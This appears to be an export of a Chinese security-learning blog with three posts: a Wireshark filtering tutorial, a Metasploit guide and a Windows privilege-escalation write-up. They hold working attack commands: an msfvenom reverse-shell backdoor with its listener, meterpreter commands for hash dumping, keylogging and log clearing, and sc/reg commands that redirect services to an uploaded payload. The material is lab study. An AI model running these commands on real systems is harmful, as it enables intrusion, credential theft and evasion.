title="捕获选项"></a>捕获选项</h2><p>捕获选项主要针对抓取数据包使用的网卡、抓包前的过滤、抓包大小、抓包时长等进行设置。这个功能在抓包软件中也属于非常重要的一个设置。</p><p><strong>数据包的过滤设置</strong></p><p>Wireshark抓包过滤是基于libpcapWinpcap库实现的，所以遵循BPF(Berke-ley Packet Filter)语法，其中包括类型(Type)、方向(Dir)、协议(Proto)、逻辑运算符。</p><ul><li>类型：host、net、port</li><li>方向：src、dst</li><li>协议：ether、ip、tcp、udp、http、ftp等</li><li>逻辑运算符：&amp;&amp;与、||或、!非</li></ul><p>例如想要抓取源地址为192.168.0.100目的端口为80的流量，过滤语句为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">src host 192.168.0.100 &amp;&amp; dst port 80<br></code></pre></td></tr></table></figure><p>想要抓取ip为192.168.0.100和192.168.0.101的流量，过滤语句为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">host 192.168.0.100 || host 192.168.0.101<br></code></pre></td></tr></table></figure><p>想要抓取除广播外的所有包，过滤语句为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">! broadcast<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329234755443.png" alt="image-20240329234755443"></p><p><strong>常用的过滤器写法</strong></p><ol><li><p>过滤mac地址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ether host &lt;需要过滤的MAC地址&gt;<br>ether src host &lt;MAC地址&gt;<br>ether dst host &lt;MAC地址&gt;<br></code></pre></td></tr></table></figure></li><li><p>过滤IP地址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">host &lt;需过滤的IP地址&gt;<br>src host&lt;IP地址&gt;<br>dst host&lt;P地址&gt;<br></code></pre></td></tr></table></figure></li><li><p>过滤端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">prot 80<br>! prot 80<br>dst port 80<br>srcport 80<br></code></pre></td></tr></table></figure></li></ol><blockquote><p>抓包过滤一旦设置后将只抓取符合规则的数据包，这样会过滤掉大量干扰数据包，从而提高抓包数据的准确率。</p></blockquote><h2 id="过滤数据包"><a href="#过滤数据包" class="headerlink" title="过滤数据包"></a>过滤数据包</h2><p>过滤数据包时抓取完之后使用显示过滤器来进行过滤，显示出所需要的数据包</p><p><strong>语法规则如下</strong></p><ul><li>比较操作符：&#x3D;&#x3D;等于、!&#x3D;不等于、&gt;大于、&lt;小于、&gt;&#x3D;大于等于、&lt;&#x3D;小于等于。</li><li>逻辑操作：and 与操作、or或操作、xor异或操作、not非操作。</li><li>IP地址：ip.addr、ip.src、ip.dst。</li><li>过滤端口：tcp.port、tcp.srcport、tcp.dstport、tep.flags.syn、 tep.flags.ack。</li><li>过滤协议：arp、ip、icmp、udp、tcp、bootp、dns等</li></ul><p>例如想要过滤指定ip的数据包</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ip.addr==192.168.1.1<br>ip.src==192.168.1.1<br>ip.dst==192.168.1.1<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330000207628.png" alt="image-20240330000207628"></p><blockquote><p>wireshark也会自带补全，类似代码补全提示的那样</p></blockquote><p>更多语法可以参考这篇文章：<a href="https://cloud.tencent.com/developer/article/1442007">https://cloud.tencent.com/developer/article/1442007</a></p><h2 id="数据包分析"><a href="#数据包分析" class="headerlink" title="数据包分析"></a>数据包分析</h2><p><strong>数据追踪</strong></p><p>正常通信中如TCP、UDP、SSL等数据包都是以分片的形发送的，如果在整个数据包中分片查看数据包不便于分析，使用数据流追踪可以将TCP、UDP、SSL等数据流进行重组，以一个完整的形式呈现出来。</p><p>开启追踪流的方式有两种：</p><ol><li>在数据流显示列表中选中要追踪的数据流，右击然后选择追踪流菜单命令。</li><li>选择”分析”菜单，然后选择追踪流。</li></ol><p>比如我这里选择追踪一个http流，他就会显示有关这个这个数据前后相关的整个通信过程</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330002214560.png" alt="image-20240330002214560"></p><blockquote><p>红色是发送请求，服务器返回的结果是蓝色</p></blockquote><p>然后我们还能看到该http请求之前的tcp三次握手的过程</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330002406512.png" alt="image-20240330002406512"></p><p>后面则是传输完成后的四次挥手</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330002541147.png" alt="image-20240330002541147"></p><p>顺便说明这个数据包的具体结构，拿这个http请求为例</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330002653500.png" alt="image-20240330002653500"></p><p>上面从上到下对应着计算机网络中的五层模型：物理层、数据链路层、网络层、传输层、应用层；如果只是tcp协议的话他就只有前四层</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330002805666.png" alt="image-20240330002805666"></p><p><strong>统计数据包</strong></p><p>通过对数据包的统计分析，可以查看更为详细的数据信息，进而分析网络中是否存在安全问题。</p><ol><li><p>选择统计菜单中的”捕获文件属性”，在其中可以查看文件、事件、捕获、接口等信息</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330003100727.png" alt="image-20240330003100727"></p></li><li><p>选择统计菜单中的”协议分级”，可以统计出每一种协议在整个数据包中的占有率</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330003233495.png" alt="image-20240330003233495"></p></li><li><p>选择统计菜单中的”会话”，其中包括以太网、IPv4、IPv6、TCP、UDP等不同协议会话信息展示。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330003457780.png" alt="image-20240330003457780"></p></li><li><p>选择统计菜单中的”端点”，其中包含以太网和各种协议选项。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330003730343.png" alt="image-20240330003730343"></p></li><li><p>选择统计菜单中的”分组长度”，可以对不同大小的数据包进行统计</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330003838451.png" alt="image-20240330003838451"></p></li><li><p>选择统计菜单中的”I&#x2F;O图表”，其中包括一个坐标轴显示的图表，下方可以添加任意的协议，也可以选择协议显示的颜色，还可以调整坐标轴的刻度。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330004032643.png" alt="image-20240330004032643"></p></li><li><p>选择统计菜单中的”流量图”，其中包括通信时间、通信地址、端口以及通信过程中的协议功能</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330004146063.png" alt="image-20240330004146063"></p></li><li><p>选择统计菜单中的”TCP流型图”，在其中可以根据实际需要设置相应的显示，还可以切换数据包的方向。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330004340761.png" alt="image-20240330004340761"></p></li></ol><h1 id="常见漏洞流量分析"><a href="#常见漏洞流量分析" class="headerlink" title="常见漏洞流量分析"></a>常见漏洞流量分析</h1><p>这里采用dvwa靶场来进行流量分析</p><h2 id="SQL注入流量分析"><a href="#SQL注入流量分析" class="headerlink" title="SQL注入流量分析"></a>SQL注入流量分析</h2>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 流量分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>msf基础使用学习</title>
      <link href="/2024/03/28/msf%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/03/28/msf%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="msf简介"><a href="#msf简介" class="headerlink" title="msf简介"></a>msf简介</h1><p>Metasploit Framework是一个综合性渗透测试工具，集成信息收集、漏洞扫描、漏洞利用以及提权等功能的工具</p><h1 id="msf目录构成"><a href="#msf目录构成" class="headerlink" title="msf目录构成"></a>msf目录构成</h1><p><strong>msf的目录位置</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/usr/share/metasploit-framework<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240328235414919.png" alt="image-20240328235414919"></p><p><strong>msf的各个模块</strong></p><p>MSF有7个模块，分别对下面目录下的7个子文件夹</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">/usr/share/metasploit-framework/modules<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240328235616101.png" alt="image-20240328235616101"></p><ol><li><p>auxiliary：负责执行信息收集、扫描、嗅探、指纹识别、口令猜测和Dos攻击等功能的辅助模块</p></li><li><p>encoders：对payload进行加密，躲避AntiVirus检查的模块</p></li><li><p>evasion：这是用于创建免杀木马的模块</p></li><li><p>exploits：利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动、被动）</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329000437236.png" alt="image-20240329000437236"></p><p>这里看一下Windows的一些提权脚本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/usr/share/metasploit-framework/modules/exploits/windows/local<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329000459473.png" alt="image-20240329000459473"></p><p>可以看到有很多脚本可以使用，后续会进行学习使用。</p></li><li><p>payloads：成功exploit之后，真正在目标系统执行的代码或指令。分为3种类型的payload，分别是single、stages和stagers。shellcode是特殊的payload，用于拿shell。</p><ul><li>single：all-in-one。完整的payload，这些payload都是一体化的，不需要依赖外部的库和包。</li><li>stagers：目标计算机内存有限时，先传输一个较小的payload用于建立连接</li><li>stages：利用stagers建立的连接下载后续payload</li></ul></li><li><p>post：后期渗透模块。在取得目标系统远程控制权后，进行一系列的后渗透攻击动作，如获取敏感信息、跳板攻击等操作</p></li><li><p>nops：提高payload稳定性及维持大小。在渗透攻击构造恶意数据缓冲区时，常常要在真正要执行的Shellcode之前添加一段空指令区， 这样当触发渗透攻击后跳转执行ShellCode时，有一个较大的安全着陆区，从而避免受到内存 地址随机化、返回地址计算偏差等原因造成的ShellCode执行失败，提高渗透攻击的可靠性。</p></li></ol><h1 id="使用msf上线meterpreter"><a href="#使用msf上线meterpreter" class="headerlink" title="使用msf上线meterpreter"></a>使用msf上线meterpreter</h1><p>这里使用Windows7来作为受害机器</p><p><strong>生成一个后门文件用于类似反弹shell</strong></p><p>在MSF中，一般我们生成payload程序后门之类的都是用<code>msfvenom</code>，msfvenom是攻击载荷生成和编码器</p><p>主要参数：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-p payload<br>-e 编码方式,指定编码器，可以实现免杀<br>-i 编码次数。指定编码迭代次数，一般配合免杀使用<br>-b: 去掉坏字符，坏字符会影响payload 正常执行<br>LHOST,LPORT 监听上线的主机IP和端口<br>-f 指定生成格式，如exe 生成EXE格式<br>-o 指定文件名称和导出位置<br>-l 可以查看可以利用payload<br></code></pre></td></tr></table></figure><p>执行下面命令生成一个可执行的后门文件：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">msfvenom -p windows/meterpreter/reverse_tcp lhost=&lt;攻击机IP&gt; lport=&lt;监听的端口号&gt; -f exe &gt; shell.exe<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329002507164.png" alt="image-20240329002507164"></p><p>然后我们启动msfconsole开启监听</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">msfconsole<br>use exploit/multi/handler<br>set payload windows/meterpreter/reverse_tcp<br>set lhost &lt;攻击者IP&gt;<br>set lport &lt;监听端口&gt;<br>exploit<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329003229229.png" alt="image-20240329003229229"></p><p>然后把我们刚刚生成的后门文件上传到Windows7上面运行之后就可以获得用户权限，得到meterpreter</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329102808964.png" alt="image-20240329102808964"></p><p>然后就可以输入一些命令进行其他操作了，比如getuid查看一下当前的身份</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329102935408.png" alt="image-20240329102935408"></p><h2 id="一些常用的命令"><a href="#一些常用的命令" class="headerlink" title="一些常用的命令"></a>一些常用的命令</h2><p>直接参考这篇文章copy了过来：<a href="https://www.freebuf.com/articles/web/387662.html">https://www.freebuf.com/articles/web/387662.html</a></p><h2 id="主界面的命令"><a href="#主界面的命令" class="headerlink" title="主界面的命令"></a>主界面的命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">show exploits – 查看所有可用的渗透攻击程序代码<br>show auxiliary – 查看所有可用的辅助攻击工具<br>show options – 查看该模块所有可用选项<br>show payloads – 查看该模块适用的所有载荷代码<br>show targets – 查看该模块适用的攻击目标类型<br>search – 根据关键字搜索某模块<br>info – 显示某模块的详细信息<br>use – 进入使用某渗透攻击模块<br>back – 回退 set/unset – 设置/禁用模块中的某个参数<br>setg/unsetg – 设置/禁用适用于所有模块的全局参数<br>save – 将当前设置值保存下来，以便下次启动MSF终端时仍可使用<br>cd 更改当前的工作目录<br>核心命令<br>Sessions 转储会话列表并显示有关会话的信息<br>Color 切换颜色<br>Set 将特定于上下文的变量设置为一个值<br>Connect 连接与主机通信<br>Setg 将全局变量设置为一个值<br>exit 退出控制台<br>sleep 在指定的秒数内不做任何事情<br>get 获取特定于上下文的变量的值<br>spool 将控制台输出写入文件以及屏幕<br>getg 获取全局变量的值<br>threads 线程查看和操作后台线程<br>grep grep 另一个命令的输出<br>unload 卸载框架插件<br>history 显示命令历史<br>unset 取消设置一个或多个特定于上下文的变量<br>irb 进入irb脚本模式<br>unsetg 取消设置一个或多个全局变量<br>load 加载一个框架插件<br>version 显示框架和控制台库版本号<br>quit 退出控制台<br>route 通过会话路由流量<br>save 保存活动的数据存储<br>数据库后端命令<br>analyze 分析有关特定地址或地址范围的数据库信息<br>db_connect 连接到现有数据服务<br>db_disconnect 断开与当前数据服务的连接<br>db_export 导出包含数据库内容的文件<br>db_import 导入扫描结果文件（将自动检测文件类型）<br>db_nmap 执行nmap并自动记录输出<br>db_rebuild_cache 重建数据库存储的模块高速缓存<br>db_remove 删除已保存的数据服务条目<br>db_save 将当前数据服务连接保存为启动时重新连接的默认值<br>db_status 显示当前数据服务状态<br>hosts 列出数据库中的所有主机<br>loot 列出数据库中的所有战利品<br>notes 列出数据库中的所有注释<br>services 列出数据库中的所有服务<br>vulns 列出数据库中的所有漏洞<br>workspace 在数据库工作区之间切换<br>凭据后端命令<br>creds 列出数据库中的所有凭据<br>模块命令<br>Advanced 显示一个或多个模块的高级选项<br>Back 从当前上下文返回<br>Edit 使用首选编辑器编辑当前模块<br>info 显示有关一个或多个模块的信息<br>loadpath 路径从路径搜索并加载模块<br>options 显示全局选项或一个或多个模块<br>popm 将最新的模块从堆栈中弹出并使其处于活动状态<br>previous 将之前加载的模块设置为当前模块<br>pushm 将活动或模块列表推入模块堆栈<br>reload_all 从所有定义的模块路径重新加载所有模块<br>search 搜索模块名称和描述<br>show 显示给定类型的模块或所有模块<br>use 按名称选择模块<br>enumdesktops #查看可用的桌面<br>getdesktop #获取当前meterpreter 关联的桌面<br>setdesktop #设置meterpreter关联的桌面 -h查看帮助<br>screenshot #截屏<br>run vnc #使用vnc远程桌面连接<br></code></pre></td></tr></table></figure><h2 id="拿到Meterepreter后"><a href="#拿到Meterepreter后" class="headerlink" title="拿到Meterepreter后"></a>拿到Meterepreter后</h2><p><strong>系统命令</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">clearav -清除了受害者的计算机上的事件日志<br>drop_token -被盗的令牌<br>execute-执行命令<br>getpid -获取当前进程 ID (PID)<br>getprivs -尽可能获取尽可能多的特权<br>getuid -获取作为运行服务器的用户<br>kill -终止指定 PID 的进程<br>ps -列出正在运行的进程<br>reboot-重新启动受害人的计算机<br>reg -与受害人的注册表进行交互<br>rev2self -在受害者机器上调用 RevertToSelf()<br>shell -在受害者计算机上打开一个shell<br>shutdown-关闭了受害者的计算机<br>steal_token -试图窃取指定的 (PID) 进程的令牌<br>sysinfo -获取有关受害者计算机操作系统和名称等的详细信息<br>sessions -查看当前的会话<br></code></pre></td></tr></table></figure><p><strong>特权升级命令</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">getprivs -尽可能提升权限<br>getsystem -获得系统管理员权限，通过各种攻击向量来提升系统用户权限<br>//不过这两种方式有时候不一定可以<br></code></pre></td></tr></table></figure><p><strong>密码转储命令</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">hashdump -抓取哈希密码 (SAM) 文件中的值<br></code></pre></td></tr></table></figure><p><strong>用户界面命令</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">enumdesktops -列出所有可访问台式机<br>getdesktop -获取当前的 meterpreter 桌面<br>idletime -检查长时间以来，受害者系统空闲进程<br>keyscan_dump -键盘记录软件的内容转储<br>keyscan_start -启动时与如 Word 或浏览器的进程相关联的键盘记录软件<br>keyscan_stop -停止键盘记录软件<br>screenshot-抓去 meterpreter 桌面的屏幕截图<br>set_desktop -更改 meterpreter 桌面<br>uictl -启用用户界面组件的一些控件<br></code></pre></td></tr></table></figure><p><strong>网络命令</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ipconfig -显示网络接口的关键信息，包括 IP 地址、 等。<br>portfwd -端口转发<br>route -查看或修改受害者路由表<br></code></pre></td></tr></table></figure><p><strong>文件系统命令</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cat -读取并输出到标准输出文件的内容<br>cd -更改目录对受害人<br>del -删除文件对受害人<br>download-从受害者系统文件下载<br>edit-用 vim编辑文件<br>getlwd -打印本地目录<br>getwd -打印工作目录<br>lcd -更改本地目录<br>lpwd -打印本地目录<br>ls -列出在当前目录中的文件列表<br>mkdir -在受害者系统上的创建目录<br>pwd -输出工作目录<br>rm -删除文件<br>rmdir -受害者系统上删除目录<br>upload-从攻击者的系统往受害者系统上传文件<br></code></pre></td></tr></table></figure><p><strong>帮助菜单</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">background – 将当前会话移动到背景<br>bgkill – 杀死一个背景 meterpreter 脚本<br>bglist – 提供所有正在运行的后台脚本的列表<br>bgrun – 作为一个后台线程运行脚本<br>channel – 显示活动频道<br>close – 关闭通道<br>exit – 终止 meterpreter 会话<br>help – 帮助菜单<br>interact – 与通道进行交互<br>irb – 进入 Ruby 脚本模式<br>migrate – 移动到一个指定的 PID 的活动进程，也就是注入进程<br>quit – 终止 meterpreter 会话<br>read – 从通道读取数据<br>run – 执行以后它选定的 meterpreter 脚本<br>use – 加载 meterpreter 的扩展<br>write – 将数据写入到一个通道<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透体系建设-权限提升</title>
      <link href="/2024/03/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
      <url>/2024/03/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</url>
      
        <content type="html"><![CDATA[<blockquote><p>权限提升可以分为横向权限提升和垂直权限提升，前者是指同级用户，后者是指低级用户到高级用户。</p></blockquote><h1 id="系统内核漏洞提权"><a href="#系统内核漏洞提权" class="headerlink" title="系统内核漏洞提权"></a>系统内核漏洞提权</h1><p>当目标系统存在该漏洞且没有更新安全补丁时，利用已知的系统内核漏洞进行提权测试人员往往可以获得系统级别的访问权限。</p><h2 id="查找漏洞"><a href="#查找漏洞" class="headerlink" title="查找漏洞"></a>查找漏洞</h2><p><strong>手动查找</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">systeminfo<br></code></pre></td></tr></table></figure><p>可以利用该命令查看系统安装的补丁</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240326091200716.png" alt="image-20240326091200716"></p><p>然后可以结合系统版本信息，借助辅助工具寻找可用的提权漏洞。</p><p><strong>借助WES-NG查找可用漏洞</strong></p><p>项目地址：<a href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a></p><p>使用方法：</p><ol><li><p>执行下面命令更新漏洞库数据</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python3 wes.py --update<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240326092255515.png" alt="image-20240326092255515"></p></li><li><p>在目标主机执行systeminfo命令，并将结果保存到sysinfo.txt中，然后执行下面命令，用WES-NG进行检查</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python3 wes.py sysinfo.txt --impact &quot;Elevation of Privilege&quot;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">--impact指定漏洞类型为提权漏洞</span><br></code></pre></td></tr></table></figure><p>emmm我的win7systeminfo文件跑出来什么都没有，跑了一下我的win11竟然有cve没绷住</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240326160918537.png" alt="image-20240326160918537"></p><p>执行下面命令查找所有已公开EXP的提权漏洞</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python3 wes.py sysinfo.txt --impact &quot;Elevation of Privilege&quot; --exploits-only<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240326161002020.png" alt="image-20240326161002020"></p></li></ol><h2 id="确定并利用漏洞"><a href="#确定并利用漏洞" class="headerlink" title="确定并利用漏洞"></a>确定并利用漏洞</h2><p>确定漏洞之后，就去找利用程序然后上传利用进行提权。</p><h1 id="系统服务提权"><a href="#系统服务提权" class="headerlink" title="系统服务提权"></a>系统服务提权</h1><p>通常情况下，用户安装的一些应用软件会在本地注册一些服务，并且大多数服务在计算机开机时以系统SYSTEM 权限启动。应用软件在注册服务时，会在以下路径中创建相应的注册表项,路径如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240327103308958.png" alt="image-20240327103308958"></p><p>其中的ImagePath指向启动系统服务的二进制程序路径</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240327103611189.png" alt="image-20240327103611189"></p><p>如果让服务启动时执行其他程序，该程序就可以随着服务的启动获得系统权限，这是利用系统服务提权的主要思路。</p><h2 id="不安全的服务权限"><a href="#不安全的服务权限" class="headerlink" title="不安全的服务权限"></a>不安全的服务权限</h2><p>ACL 定义了安全对象的访问控制策略，用于规定哪些主体对其拥有访问权限和拥有什么样的权限。Windows 的系统服务正是通过 ACL 来指定用户对其拥有的权限，常见的权限列表如下：</p><table><thead><tr><th>权限</th><th>说明</th></tr></thead><tbody><tr><td>SERVICE_START</td><td>启动服务的权限</td></tr><tr><td>SERVICE_STOP</td><td>停止服务的权限</td></tr><tr><td>SERVICE_PAUSE_CONTINUE</td><td>暂停&#x2F;继续运行服务的权限</td></tr><tr><td>SERVICE_QUERY_STATUS</td><td>查询服务状态的权限</td></tr><tr><td>SERVICE_QUERY_CONFIG</td><td>查询服务配置的权限</td></tr><tr><td>SERVICE_CHANGE_CONFIG</td><td>更改服务配置的权限</td></tr><tr><td>SERVICE_ALL_ACCESS</td><td>完全控制权限</td></tr></tbody></table><p>如果用户在配置服务时使得低权限用户对高权限下运行的系统服务拥有更改服务配置的权限，我们就可以直接修改系统服务启动时的二进制文件路径。</p><blockquote><p>AccessChk工具可以枚举目标主机上存在权限缺陷的系统服务。AccessChk是微软官方提供的管理工具，常用来枚举或查看系统中指定用户、组对特定资源(包括但不限于文件、文件夹、注册表、全局对象和系统服务等)的访问权限。</p><p>工具地址：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk">https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk</a></p></blockquote><p>低权限用户可以检查“Authenticated Users”组和“INTERACTIVE”组对系统服务的权限。前者为经过身份验证的用户，包含系统中所有使用用户名、密码登录并通过身份验证的账户，但不包括来宾账户；后者为交互式用户组，包含系统中所有直接登录到计算机进行操作的用户。默认情况下，这两个组为计算机本地“Users”组的成员。</p><p>执行下面命令枚举”Authenticated Users”组是否具有更改服务配置的权限</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">accesschk.exe /accepteula -uwcqv &quot;Authenticated Users&quot; *<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-uwcqv: 这些选项表示 AccessChk 将以详细格式显示对象的安全描述符信息。每个选项的含义如下：<br><br>u: 显示所属用户（Owner）信息。<br>w: 显示子对象的权限。<br>c: 显示所选对象的ACL（访问控制列表）信息。<br>q: 静默模式，只显示结果而不显示头部信息。<br>v: 显示详细信息。<br></code></pre></td></tr></table></figure><p>我在本机没有找到有更改权限的用户</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240327105943719.png" alt="image-20240327105943719"></p><p>以书上例子在找到权限的情况下应该如何利用：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240327112003498.png" alt="image-20240327112003498"></p><p>可以看到该组对InsproSvc服务具有更改服务配置的权限，然后执行下面的命令，我们就可以将该服务启动时执行的二进制文件替换为我们上传的攻击载荷</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sc config InsproSvc binpath= &quot;cmd.exe /k C:\Users\Public\reverse_tcp.exe&quot;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">binpath，指定服务的二进制文件路径，注意“=”后必须有一个空格</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240327112213382.png" alt="image-20240327112213382"></p><p>如果当前用户对该服务拥有SERVICE_STOP和SERVICE_START权限，即我们拥有可以重启服务的权限</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sc stop &lt;service name&gt;<br>sc start &lt;service name&gt;<br></code></pre></td></tr></table></figure><h2 id="服务注册表权限脆弱"><a href="#服务注册表权限脆弱" class="headerlink" title="服务注册表权限脆弱"></a>服务注册表权限脆弱</h2><p>Windows 的注册表中存储了每个系统服务的条目，而注册表使用 ACL 来管理用户对其所拥有的访问权限。如果注册表的 ACL配置错误，使得一个低权限用户对服务的注册表拥有写入权限，此时可以通过修改注册表来更改服务配置。例如修改注册表中的ImagePath键。</p><ol><li><p>执行下面命令枚举”Authenticated Users”是否具有服务注册表写入权限的用户</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">accesschk.exe /accepteula -uvwqk &quot;Authenticated Users&quot; HKLM\SYSTEM\CurrentControlSet\Services<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-uvwqk: 这些选项表示 AccessChk 将以详细格式显示对象的安全描述符信息。每个选项的含义如下：<br>u: 显示所属用户（Owner）信息。<br>v: 显示所选对象的详细信息。<br>w: 深入显示子项的信息（递归检查）。<br>q: 静默模式，只显示结果而不显示头部信息。<br>k: 同意许可证。<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240327214529644.png" alt="image-20240327214529644"></p></li><li><p>该用户组对RegSvc服务的注册表具有完全控制权限，所以我们可以执行下面命令将注册表中的ImagePath键指向我们上传的攻击载荷</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg add HKLM\SYSTEM\CurrentControlSet\Services\RegSvc /v ImagePath /t REG_EXPAND_SZ /d &quot;cmd.exe /k C:\Users\Public\reverse_tcp.exe&quot; /f<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/v：指定要添加或修改的注册表值的名称。<br>/t：指定注册表值的类型。在这里是REG_EXPAND_SZ，表示该值包含可扩展的字符串。<br>/d：指定要设置的数据值。<br>/f：在执行命令时强制执行，即不进行提示确认操作。<br></code></pre></td></tr></table></figure></li><li><p>执行下面命令检查当前用户对该服务是否有重启权限：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">accesschk.exe /accepteula -ucqv &quot;Authenticated Users&quot; RegSvc<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240327215915634.png" alt="image-20240327215915634"></p><p>然后我们就可以重启服务进行提权</p></li></ol><h2 id="服务路径权限可控"><a href="#服务路径权限可控" class="headerlink" title="服务路径权限可控"></a>服务路径权限可控</h2><p>如果目标主机上用户存在错误配置或操作，使得一个低权限的用户对此服务调用的二进制文件或其所在目录拥有写入权限，那么可以直接将该文件替换成攻击载荷，并随着服务的启动继承系统权限。</p><ol><li><p>执行下面命令查看InsexeSvc这个服务的二进制文件所在的目录是否有写入权限</p><figure class="highlight 